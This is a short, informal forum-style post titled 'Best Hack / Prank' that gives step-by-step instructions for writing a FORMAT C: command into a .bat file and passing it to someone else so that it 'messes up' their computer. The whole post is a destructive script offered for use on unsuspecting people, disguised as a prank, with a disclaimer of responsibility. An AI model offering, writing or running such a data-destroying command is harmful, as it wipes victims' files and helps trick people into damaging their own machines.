channel.title: Best Hack / Prank
channel.description:
When i mean best i mean it messes up your computer. You Can just give it to someone else. If you do this i am not responsible for shit. If ya wanna fix, try System Recovery.
Goto Start Goto Run Type Notepad or w,e thing u use put this in [code]FORMAT C:[/code] Save As....anything.bat
Enjoy Screwing Your Computer!
